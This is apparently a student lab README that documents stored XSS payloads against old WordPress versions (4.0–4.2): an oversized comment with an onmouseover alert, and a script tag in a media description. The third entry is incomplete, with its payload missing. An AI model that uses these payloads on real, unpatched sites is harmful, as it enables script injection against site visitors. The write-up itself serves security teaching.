# README

Time Spent: 4 hours in total

Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

XXS

  - [ ] Summary: 
  
      I am using XSS with WP 4.2, which was fixed in version 4.2.1.
  - [ ] GIF Walkthrough:![](https://i.imgur.com/xslxj31.gif)
  - [ ] Steps to Recreate:
  
     You have to comment on a post and insert the following into a comment: 
     
     <a title='x onmouseover=alert(unescape(/hello%20world/.source))          style=position:absolute;left:0;top:0;width:5000px;height:5000px <You will then insert 64,000 of a character and hit comment>
  - [ ] Affected Source Code: 
        None
  
  
XXS

  - [ ] Summary:
  
  I am using XSS with WP 4.2, which was fixed in version 4.7.3.
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/uDAam90.gif)
  - [ ] Steps to Recreate:
  
        1. Create a media post 
        
        2. Add  "filename <script>alert("Exploit 3 Successful");</script>" to the desciption (include the quotes)
        
        3. Then click view attachment page and the alert box will pop up
  - [ ] Affected Source Code:
        None
  
  
  XXS

  - [ ] Summary:
 
  I am using XSS with WP 4.0, which was fixed in version 4.2.
  - [ ] GIF Walkthrough:![]()
  - [ ] Steps to Recreate:
  
  You post the following into a comment on a post: 
  - [ ] Affected Source Code:
        None

